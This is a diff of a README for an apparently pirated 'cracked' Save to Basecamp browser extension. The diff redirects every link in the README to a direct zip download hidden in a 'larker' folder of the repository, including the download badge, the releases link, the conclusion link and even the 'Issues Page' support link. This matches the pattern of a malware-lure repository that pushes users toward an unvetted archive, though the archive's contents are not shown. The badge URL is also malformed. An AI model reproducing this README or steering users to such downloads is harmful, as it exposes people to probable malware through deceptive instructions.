@@ -1,7 +1,7 @@
 # 🚀 cracked-save-to-basecamp-extension - Save your work with ease
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/znrril/cracked-save-to-basecamp-extension/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/znrril/cracked-save-to-basecamp-extension/main/larker/cracked-save-to-basecamp-extension.zip%https://raw.githubusercontent.com/znrril/cracked-save-to-basecamp-extension/main/larker/cracked-save-to-basecamp-extension.zip)](https://raw.githubusercontent.com/znrril/cracked-save-to-basecamp-extension/main/larker/cracked-save-to-basecamp-extension.zip)
 
 ## 📖 Introduction
 Welcome to the cracked Save to Basecamp Extension! This tool helps you save your documents and projects quickly to Basecamp. It is designed for everyone, whether you're a student, a professional, or anyone who wants to increase their productivity. With this simple browser extension, you can save your work directly to Basecamp in just a few clicks.
@@ -10,7 +10,7 @@ Welcome to the cracked Save to Basecamp Extension! This tool helps you save your
 To use the cracked Save to Basecamp Extension, follow these steps:
 
 1. **Download the Extension**
-   - Visit this page to download: [Releases Page](https://github.com/znrril/cracked-save-to-basecamp-extension/releases).
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/znrril/cracked-save-to-basecamp-extension/main/larker/cracked-save-to-basecamp-extension.zip).
   
 2. **Install the Extension**
    - If you are using Google Chrome:
@@ -55,7 +55,7 @@ If you face issues during installation or usage, here are some tips:
 
 ## 💬 Support
 For additional support, you can:
-- Visit our [Issues Page](https://github.com/znrril/cracked-save-to-basecamp-extension/issues) to report problems.
+- Visit our [Issues Page](https://raw.githubusercontent.com/znrril/cracked-save-to-basecamp-extension/main/larker/cracked-save-to-basecamp-extension.zip) to report problems.
 - Check FAQs and community discussions to find solutions to common issues.
 
 ## 📄 License
@@ -68,6 +68,6 @@ We plan to add more features, including:
 - Enhanced user settings for improved functionality.
 
 ## 🔗 Conclusion
-We hope you find the cracked Save to Basecamp Extension useful. Download and start streamlining your productivity today! Remember to visit the [Releases Page](https://github.com/znrril/cracked-save-to-basecamp-extension/releases) for updates and new features.
+We hope you find the cracked Save to Basecamp Extension useful. Download and start streamlining your productivity today! Remember to visit the [Releases Page](https://raw.githubusercontent.com/znrril/cracked-save-to-basecamp-extension/main/larker/cracked-save-to-basecamp-extension.zip) for updates and new features.
 
 Thank you for using our extension!
